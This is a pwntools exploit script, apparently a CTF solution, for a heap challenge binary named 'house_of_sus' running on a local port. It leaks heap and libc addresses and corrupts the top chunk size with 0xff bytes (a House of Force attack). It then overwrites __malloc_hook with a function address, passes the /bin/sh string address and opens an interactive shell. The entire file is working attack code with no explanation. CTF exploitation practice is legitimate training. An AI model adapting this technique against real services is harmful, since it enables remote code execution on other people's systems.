# Crafted and Developed by knittingirl
# Slightly modified by Oreomeister (mostly IO cleaning up)

from pwn import *

# target = process('./house_of_sus')
target = remote('127.0.0.1', 23001)
elf = ELF('house_of_sus')
#pid = gdb.attach(target, 'b *0x0000000000400d84\ncontinue')

libc = ELF('libc.so.6')
#print(target.recvuntil(b'game:'))
target.recvuntil(b'game:')
leak = target.recvline()
#print(leak)
heap_leak = int(leak, 16)
print("[-] heap leak @ " + hex(heap_leak))
heap_base = heap_leak - 0x660


#print(target.recvuntil(b'meeting'))
target.recvuntil(b'meeting')
target.sendline(b'1')

#print(target.recvuntil(b'meeting'))
target.recvuntil(b'meeting')
target.sendline(b'2')

#print(target.recvuntil(b'seed:'))
target.recvuntil(b'seed:')
leak = target.recvline()
rand_leak = int(leak)
print("[-] libc rand leak @ " + hex(rand_leak))
libc_base = rand_leak - libc.symbols['rand']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print("[-] malloc_hook @ " + hex(malloc_hook))

target.sendline(b'1')
#print(target.recvuntil(b'meeting'))
target.recvuntil(b'meeting')
target.sendline(b'3')

target.sendline(str(0x20).encode())

target.sendline(b'a' * 0x28 + b'\xff' * 8)
distance = malloc_hook - heap_base - 0x90 - 0x8 - 0x8 - 0x10 - 0x1630 #- 0x10


#print(target.recvuntil(b'meeting'))
target.recvuntil(b'meeting')
target.sendline(b'3')
#print(target.recvline(b'meeting'))
target.recvline(b'meeting')
target.sendline(b'3')
#print(target.recvuntil(b'tasks >:('))
target.recvuntil(b'tasks >:(')

sleep(0.5)
target.sendline(str(distance).encode())
target.sendline(b'hello')

#print(target.recvuntil(b'Red'))
target.recvuntil(b'Red')
target.sendline(b'3')
#print(target.recvline(b'meeting'))
target.recvline(b'meeting')
target.sendline(b'3')
target.sendline(str(0x50).encode())
target.sendline(p64(elf.symbols['be_imposter']))

binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

print("[+] Dropping Shell")

target.sendline(b'3')
#print(target.recvline(b'meeting'))
target.recvline(b'meeting')
target.sendline(b'3')
target.sendline(str(binsh).encode())

target.recvuntil(b'tasks >:(')
target.recvuntil(b'tasks >:(')

target.interactive()
